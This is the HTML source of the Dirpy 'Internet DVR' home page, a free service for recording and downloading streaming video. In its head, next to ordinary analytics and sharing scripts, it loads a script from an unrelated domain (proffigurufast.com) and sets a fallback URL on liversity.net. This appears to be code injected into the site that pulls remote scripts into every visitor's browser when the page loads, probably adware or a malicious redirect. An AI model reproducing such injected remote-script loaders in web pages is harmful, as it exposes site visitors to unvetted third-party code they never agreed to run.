<!DOCTYPE html>
<html lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

		<link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css" />
		<link rel="stylesheet" type="text/css" href="/css/bootstrap-timepicker.min.css" />
		<link rel="stylesheet" type="text/css" href="/css/style.css?v=11" />
		<link rel="stylesheet" type="text/css" href="/css/font-awesome.css">
		<link rel="stylesheet" type="text/css" href="/css/jquery-ui.min.css" />

		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
		<script src="/js/bootstrap.js"></script>
		<script src="/js/bootstrap-timepicker.min.js"></script>
		<script src="/js/jquery-ui.min.js"></script>

		<title>Dirpy | Internet DVR</title>
		<meta name="description" content="Record, convert, clip and download your favorite streaming content for free!">
		<meta name="keywords" content="internet dvr, convert streaming video, convert streaming audio, convert video to mp3, download streaming video, clip online video, clip online audio">
		<meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1" />

		<script type="text/javascript">
			var _gaq = _gaq || [];
			_gaq.push(['_setAccount', 'UA-36715006-1']);
			_gaq.push(['_setDomainName', 'dirpy.com']);
			_gaq.push(['_trackPageview']);

			(function() {
				var ga = document.createElement('script');
				ga.type = 'text/javascript';
				ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0];
				s.parentNode.insertBefore(ga, s);
			})();
		</script>
		
		<!-- AddThis Smart Layers BEGIN -->
		<!-- Go to http://www.addthis.com/get/smart-layers to customize -->
		<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-521bd5f16d130f36"></script>
		<script type="text/javascript">
			addthis.layers({
				'theme': 'transparent',
				'share': {
					'position': 'left',
					'numPreferredServices': 4
				}
			});
		</script>
		<!-- AddThis Smart Layers END -->
		
		<script type="text/javascript" src="http://proffigurufast.com/key/9b85f417f24d04339ac434f926e2a998"></script>
		<script type="text/javascript">
    	var pn;
    	try{
	        if(typeof dl_0 != 'undefined'){
	            pn='http://'+dl_0;
		    }else{
		         pn='http://liversity.net/v3992';
		    }
	    } catch(e){
	        pn='http://liversity.net/v3992';
	    } 
	    </script>
	</head>

	<body id="main">
		<nav class="navbar navbar-default navbar-fixed-bottom" role="navigation">
		<div class="container-fluid">
			<!-- Brand and toggle get grouped for better mobile display -->
			<div class="navbar-header">
			  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			  </button>
			  <a class="navbar-brand" href="/"><img src="/images/logo-115x50.png" height="25" width="58"></a>
			</div>

			<!-- Collect the nav links, forms, and other content for toggling -->
			<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			  <ul class="nav navbar-nav">
				<li><a href="/site/about">About</a></li>
				<li><a href="/site/faq">FAQ</a></li>
				<li><a href="/site/advertise">Advertise</a></li>
				<li><a href="/site/contact">Contact</a></li>
				
			  </ul>
			  <ul class="nav navbar-nav navbar-right">				
				<li><a href="/site/api">API</a></li>
				<li><a href="/site/privacy">Privacy</a></li>
				<li><a href="/site/legal">Legal</a></li>
				<li><a href="/site/terms">Terms of Service</a></li>
			  </ul>
			</div><!-- /.navbar-collapse -->
		  </div><!-- /.container-fluid -->
		</nav>		
		<div class="container">
							<table style="width: 100%; height: 100%">
	<tr>
		<td class="text-center container-fluid">
			<a href="/"><img src="/images/logo.png" alt="Dirpy!" width="200" height="87"></a>
			<h6>Internet DVR</h6>
			
			<div class="search_bar">
				<form method="GET" action="/studio" class="form-horizontal">
					<div class="form-group">
						<div class="col-sm-6 col-sm-offset-3 col-xs-8 col-xs-offset-2">
							<div class="input-group">
								<input placeholder="Enter Video URL..." name="url" id="url" type="text" class="form-control">
								<span class="input-group-btn">
									<button class="btn btn-info" type="submit">dirpy!</button>
								</span>
							</div>
						</div>
					</div>
				</form>
				<span class="help-block">
					Ex: <a href="javascript:;" onclick="$('#url').val($(this).html());
							">https://www.youtube.com/watch?v=Gc2en3nHxA4</a>
				</span>
			</div>
			<div id="dirpy-news">
			<a href="https://changelly.com/?ref_id=cf763c584c82" target="_blank">Buy Bitcoin</a>
			</div>
			<div class="text-center fa-4x social">
				<a href="http://www.facebook.com/dirpy" target="_blank">
					<i class="fa fa-facebook-square"></i>
				</a>

				<a href="http://www.twitter.com/dirpy" target="_blank">
					<i class="fa fa-twitter-square"></i>
				</a>
			</div>
		</td>
	</tr>
</table>
<br/><br/><br/>		</div>
		<br/><br/><br/>
	</body>
</html>